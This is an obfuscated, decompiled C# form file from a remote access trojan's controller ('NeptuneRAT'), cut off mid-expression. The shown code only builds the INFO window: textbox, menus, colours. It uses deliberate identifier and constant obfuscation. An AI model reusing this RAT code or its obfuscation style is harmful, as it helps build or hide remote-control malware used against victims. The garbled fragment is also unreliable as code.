// Decompiled with JetBrains decompiler
// Type: NeptuneRAT.INFO
// Assembly: NeptuneRAT Free Version V2, Version=2.2.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 48C579C5-C5A1-4244-9537-C19C9217B961
// Assembly location: \\VBOXSVR\B4s3\ToxicDatabase-main\Tools\NeptuneRAT\NeptuneRAT.7z\neptunerat.exe

using Guna.UI2.WinForms;
using Guna.UI2.WinForms.Enums;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Text;
using System.IO;
using System.Runtime.CompilerServices;
using System.Windows.Forms;

#nullable disable
namespace NeptuneRAT;

[DesignerGenerated]
public class INFO : Form
{
  private IContainer \u2694️MasonRAT\u270Cﻋﻻ\u060Cٸּڙـد\u060Dمۡﻋ\u060Dم\u060Fـۡدـ;
  public Client \u2694️MasonRAT\u270C\u060D\u060Cڝدڙـﯧگـح\u060Aدٻـﻼ\u060Cؤـۧﻻ;
  public string \u2694️MasonRAT\u270C\u060Fـڙ\u060Bۜةڇدۡڙ̍ـ\u060Bـؤ\u060C\u0609ـٺ;

  public INFO()
  {
    this.Load += new EventHandler(this.\u2694️MasonRAT\u270Cـ\u0608\u060Aټـ\u060E\u0609\u060A؁ټؤا\u060Aد\u060F);
    this.\u2694️MasonRAT\u270Cحـۨ\u0608ڙۚـؤٺ\u0609ﻋ\u060D\u060A\u0609\u060E\u060Eڙۡ();
  }

  [DebuggerNonUserCode]
  protected override void Dispose(bool disposing)
  {
    try
    {
      if (!disposing || this.\u2694️MasonRAT\u270Cﻋﻻ\u060Cٸּڙـد\u060Dمۡﻋ\u060Dم\u060Fـۡدـ == null)
        return;
      this.\u2694️MasonRAT\u270Cﻋﻻ\u060Cٸּڙـد\u060Dمۡﻋ\u060Dم\u060Fـۡدـ.Dispose();
    }
    finally
    {
      base.Dispose(disposing);
    }
  }

  [DebuggerStepThrough]
  private void \u2694️MasonRAT\u270Cحـۨ\u0608ڙۚـؤٺ\u0609ﻋ\u060D\u060A\u0609\u060E\u060Eڙۡ()
  {
    this.\u2694️MasonRAT\u270Cﻋﻻ\u060Cٸּڙـد\u060Dمۡﻋ\u060Dم\u060Fـۡدـ = (IContainer) new System.ComponentModel.Container();
    ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof (INFO));
    this.\u2694️MasonRAT\u270Cدٸ\u060Fﻻ\u0609ـ\u0608ۛــــ\u0609ــْ\u060B\u0608ڣـ = new TextBox();
    this.\u2694️MasonRAT\u270Cـ\u060Bﻻ\u060Eء\u060F̨گـ\u060Eــم\u060F\u060A = new Guna2ContextMenuStrip();
    this.\u2694️MasonRAT\u270Cۡم\u060A\u060Dۡڟﻋټڙڇــڙ = new ToolStripMenuItem();
    this.\u2694️MasonRAT\u270C\u0608ټۙٻ\u060Cـڙـڙ\u060Dـ\u060E = new ToolStripMenuItem();
    this.\u2694️MasonRAT\u270Cْ̍ڟ\u0609\u060B\u060C\u060Eـ\u0609طٺئ = new ToolStripMenuItem();
    this.\u2694️MasonRAT\u270Cـ\u060Dڜۙـﮪڕ\u060F\u060B\u060D\u060A = new ContextMenuStrip(this.\u2694️MasonRAT\u270Cﻋﻻ\u060Cٸּڙـد\u060Dمۡﻋ\u060Dم\u060Fـۡدـ);
    this.\u2694️MasonRAT\u270Cبٺ\u060D\u060Fۏ\u060D̍ــمﻻڙـ = new ToolStripMenuItem();
    this.\u2694️MasonRAT\u270C\u060Bڛــﮪبڟدټ\u060E\u060D\u060D = new ToolStripMenuItem();
    this.\u2694️MasonRAT\u270Cٺۭ\u060Dـﻋـ\u0020ــٺ\u060F\u060Aد\u0609ا\u060Fحـــ = new ToolStripMenuItem();
    this.\u2694️MasonRAT\u270C\u060Aگـڝـ\u060Bــ\u0608\u0608ۡ̍\u060Aڙ\u0608ـڙ = new Timer(this.\u2694️MasonRAT\u270Cﻋﻻ\u060Cٸּڙـد\u060Dمۡﻋ\u060Dم\u060Fـۡدـ);
    this.\u2694️MasonRAT\u270Cـ\u0609ـئـۡٺټ\u0609\u0609ڙڛڝ\u060D = new Guna2Elipse(this.\u2694️MasonRAT\u270Cﻋﻻ\u060Cٸּڙـد\u060Dمۡﻋ\u060Dم\u060Fـۡدـ);
    this.\u2694️MasonRAT\u270Cۙبٽڜﻻټـ\u060C̍ڙۭۙ\u060Bـ\u0608مـ\u0609 = new Guna2CustomGradientPanel();
    this.\u2694️MasonRAT\u270Cــڙ\u060Aـ\u060E\u060Dـــٺـد\u0608\u060Dؤ = new Guna2ControlBox();
    this.\u2694️MasonRAT\u270Cڝ\u060Dڜ\u060Dـژۡـــ̍ڠدڛاحټ = new Guna2GroupBox();
    this.\u2694️MasonRAT\u270Cٸڙـد\u060Bٽــ\u0608ۭ = new Guna2ControlBox();
    this.\u2694️MasonRAT\u270C\u060Eدٸټ\u060Eـا\u060F\u0608ـ\u0608̨ۜۙ = new Guna2DragControl(this.\u2694️MasonRAT\u270Cﻋﻻ\u060Cٸּڙـد\u060Dمۡﻋ\u060Dم\u060Fـۡدـ);
    this.\u2694️MasonRAT\u270Cـ\u060Bﻻ\u060Eء\u060F̨گـ\u060Eــم\u060F\u060A.SuspendLayout();
    this.\u2694️MasonRAT\u270Cـ\u060Dڜۙـﮪڕ\u060F\u060B\u060D\u060A.SuspendLayout();
    this.\u2694️MasonRAT\u270Cۙبٽڜﻻټـ\u060C̍ڙۭۙ\u060Bـ\u0608مـ\u0609.SuspendLayout();
    this.\u2694️MasonRAT\u270Cڝ\u060Dڜ\u060Dـژۡـــ̍ڠدڛاحټ.SuspendLayout();
    this.SuspendLayout();
    this.\u2694️MasonRAT\u270Cدٸ\u060Fﻻ\u0609ـ\u0608ۛــــ\u0609ــْ\u060B\u0608ڣـ.BackColor = Color.FromArgb(((-2023435791 ^ 1845744203 << 1554108966) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) << (0 << 1)) + ((1508957013 ^ 561716024 >> 1429810643) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) + (0 >> 1) << (-1239632987 - 1889831230 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) ^ 0 ^ 0)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) + 0, ((1863499186 ^ 1219225018 % 1136453048) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) << (0 >> 1)) - (1820331463 - 2042525840 % 507169286 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) ^ 0 >> 1 | 2028316452 - 1861523879 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) << (0 << 1)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) - 0, (-155866561 - 1058105039 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) >> -0 ^ ~(955783750 + 258187928 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) + (0 ^ 0))) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) ^ 0);
    this.\u2694️MasonRAT\u270Cدٸ\u060Fﻻ\u0609ـ\u0608ۛــــ\u0609ــْ\u060B\u0608ڣـ.BorderStyle = BorderStyle.None;
    this.\u2694️MasonRAT\u270Cدٸ\u060Fﻻ\u0609ـ\u0608ۛــــ\u0609ــْ\u060B\u0608ڣـ.ContextMenuStrip = (ContextMenuStrip) this.\u2694️MasonRAT\u270Cـ\u060Bﻻ\u060Eء\u060F̨گـ\u060Eــم\u060F\u060A;
    this.\u2694️MasonRAT\u270Cدٸ\u060Fﻻ\u0609ـ\u0608ۛــــ\u0609ــْ\u060B\u0608ڣـ.Dock = (DockStyle) ((1051361930 - 898172166 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) >> (0 << 1)) - (724346347 - 111587308 % 1115214039 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 << 1) >> (1230776532 + ~399143089 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) >> -0)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) + 0);
    this.\u2694️MasonRAT\u270Cدٸ\u060Fﻻ\u0609ـ\u0608ۛــــ\u0609ــْ\u060B\u0608ڣـ.Font = new Font(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 2255), 9.75f, FontStyle.Regular, (GraphicsUnit) (((-1653706273 ^ ~635974492) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) + -0 ^ (1654060254 - 458050477 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) + (0 >> 1) | (1164707386 > 54830643 ? 24681598 : 32908797) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) ^ 0 ^ 0)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) >> 0), (byte) 0);
    this.\u2694️MasonRAT\u270Cدٸ\u060Fﻻ\u0609ـ\u0608ۛــــ\u0609ــْ\u060B\u0608ڣـ.ForeColor = Color.White;
    this.\u2694️MasonRAT\u270Cدٸ\u060Fﻻ\u0609ـ\u0608ۛــــ\u0609ــْ\u060B\u0608ڣـ.Location = new Point(0, 40);
    this.\u2694️MasonRAT\u270Cدٸ\u060Fﻻ\u0609ـ\u0608ۛــــ\u0609ــْ\u060B\u0608ڣـ.Multiline = true;
    this.\u2694️MasonRAT\u270Cدٸ\u060Fﻻ\u0609ـ\u0608ۛــــ\u0609ــْ\u060B\u0608ڣـ.Name = \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 2256);
    this.\u2694️MasonRAT\u270Cدٸ\u060Fﻻ\u0609ـ\u0608ۛــــ\u0609ــْ\u060B\u0608ڣـ.ReadOnly = true;
    this.\u2694️MasonRAT\u270Cدٸ\u060Fﻻ\u0609ـ\u0608ۛــــ\u0609ــْ\u060B\u0608ڣـ.ScrollBars = (ScrollBars) (((1511762885 | 1712830367) - 1832865599 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) >> (0 ^ 0)) - ((5604141 | 971219037) - 689386208 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) << (0 ^ 0)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) - 0);
    this.\u2694️MasonRAT\u270Cدٸ\u060Fﻻ\u0609ـ\u0608ۛــــ\u0609ــْ\u060B\u0608ڣـ.Size = new Size(((2036412292 > 1965901806 ? -740232680 : -986976906) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) << -0) + ((1914638107 ^ (1400623496 | 1210938904)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) >> (0 >> 1) << ((583033797 ^ 2035999652 << 488742719) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) ^ 0 >> 1)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) ^ 0, 470);
    this.\u2694️MasonRAT\u270Cدٸ\u060Fﻻ\u0609ـ\u0608ۛــــ\u0609ــْ\u060B\u0608ڣـ.TabIndex = 1;
    this.\u2694️MasonRAT\u270Cدٸ\u060Fﻻ\u0609ـ\u0608ۛــــ\u0609ــْ\u060B\u0608ڣـ.Text = \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 2257);
    this.\u2694️MasonRAT\u270Cـ\u060Bﻻ\u060Eء\u060F̨گـ\u060Eــم\u060F\u060A.BackColor = Color.FromArgb((1368685671 ^ -568498689) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 << 1) - -(-762960622 - 1645166223 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) >> (0 << 1)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) + 0, (1889280637 - (55522437 << 39646446) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) >> 0 + 0) + (-1947564584 - 795174971 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) + (0 + 0)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) << 0, ((135913992 > 349759572 ? 60 : 45) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 << 1) ^ 1487686051 - 1487686044 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) ^ 0 + 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) >> 0);
    this.\u2694️MasonRAT\u270Cـ\u060Bﻻ\u060Eء\u060F̨گـ\u060Eــم\u060F\u060A.Font = new Font(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 2258), 12f, FontStyle.Regular, (GraphicsUnit) (((31204201 > 1984622505 ? -953236497 : -714927373) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 + 0) ^ -(466814497 + 248112879 % 2011728555 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) << (0 ^ 0))) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) ^ 0), (byte) 0);
    this.\u2694️MasonRAT\u270Cـ\u060Bﻻ\u060Eء\u060F̨گـ\u060Eــم\u060F\u060A.ImageScalingSize = new Size(((2025501706 > 247994031 ? 216324095 : 288432126) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) >> (0 ^ 0)) - (582387944 - 366063869 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) << (0 << 1)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) + 0, 21);
    ToolStripItemCollection items1 = this.\u2694️MasonRAT\u270Cـ\u060Bﻻ\u060Eء\u060F̨گـ\u060Eــم\u060F\u060A.Items;
    ToolStripItem[] toolStripItems1 = new ToolStripItem[((262150379 ^ 496920436 >> 437102154) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) ^ 0 << 1 ^ ((1277658794 | 629165395) - 1761835930 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) << -0 | (578029912 | 1301301002) - 1691148265 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) + (0 + 0))) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) >> 0];
    toolStripItems1[0] = (ToolStripItem) this.\u2694️MasonRAT\u270Cۡم\u060A\u060Dۡڟﻋټڙڇــڙ;
    toolStripItems1[1] = (ToolStripItem) this.\u2694️MasonRAT\u270C\u0608ټۙٻ\u060Cـڙـڙ\u060Dـ\u060E;
    toolStripItems1[((25425115 ^ -757092250) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) << -0) - -(-1825756802 - 1720282681 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) + -0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) >> 0] = (ToolStripItem) this.\u2694️MasonRAT\u270Cْ̍ڟ\u0609\u060B\u060C\u060Eـ\u0609طٺئ;
    items1.AddRange(toolStripItems1);
    this.\u2694️MasonRAT\u270Cـ\u060Bﻻ\u060Eء\u060F̨گـ\u060Eــم\u060F\u060A.Name = \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 2259);
    this.\u2694️MasonRAT\u270Cـ\u060Bﻻ\u060Eء\u060F̨گـ\u060Eــم\u060F\u060A.RenderStyle.ArrowColor = Color.FromArgb((1987908598 % 698174637 - 275063553 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) >> (0 ^ 0) > ~1143047277 - 2132506288 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) + (0 + 0) ? 153305883 - (76652893 << 876995841) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 << 1) : (-1986986036 ^ -1986986107) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) >> -0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) + 0, (1123422350 + ~931946036 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) ^ 0 + 0) - (-1633570275 - (1941588380 << 655127473) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) + (0 + 0)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) - 0, (1025155018 > 724496071 ? -138970079 : -185293438) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 >> 1) + ((138970218 ^ 290416250 >> 525198168) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) << (0 >> 1)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) >> 0);
    this.\u2694️MasonRAT\u270Cـ\u060Bﻻ\u060Eء\u060F̨گـ\u060Eــم\u060F\u060A.RenderStyle.BorderColor = Color.FromArgb(676923016 + 1931102833 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) + (0 >> 1) - (1236743430 + (716069757 >> 1699281755) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) >> -0 << ((1177404167 > 1917844536 ? 950391770 : 712793828) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) ^ 0 + 0)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) + 0, (132434083 - 951568568 % 917256417 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) >> (0 >> 1)) - (679709568 % 1759746985 - 581587696 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) + -0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) >> 0, 1292584985 + 745834626 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) + -0 - ((835007471 ^ (408291368 | 163230781)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) << (0 >> 1) | (-611104588 ^ ~1561066166) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 << 1)) + 